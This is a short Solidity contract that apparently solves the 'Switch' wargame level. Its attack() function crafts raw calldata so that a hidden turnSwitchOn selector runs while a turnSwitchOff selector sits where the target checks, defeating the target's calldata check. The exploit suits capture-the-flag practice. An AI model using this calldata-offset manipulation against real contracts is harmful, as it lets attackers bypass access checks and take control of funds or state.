// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface ISwitch {
    function switchOn() external view returns (bool);
    function flipSwitch(bytes memory _data) external;
}

contract Switch {
    ISwitch switchInstance;

    constructor(address _instanceAddress) payable {
        switchInstance = ISwitch(_instanceAddress);
    }

    function attack() external {
        bytes4 turnSwitchOnSelector = bytes4(keccak256("turnSwitchOn()"));
        bytes4 turnSwitchOffSelector = bytes4(keccak256("turnSwitchOff()"));
        (bool success,) = address(switchInstance).call(
            abi.encodeWithSelector(
                ISwitch.flipSwitch.selector,
                abi.encode(turnSwitchOnSelector),
                bytes32(0x0),
                bytes32(turnSwitchOffSelector)
            )
        );
        require(success && switchInstance.switchOn(), "Attack failed");
    }
}
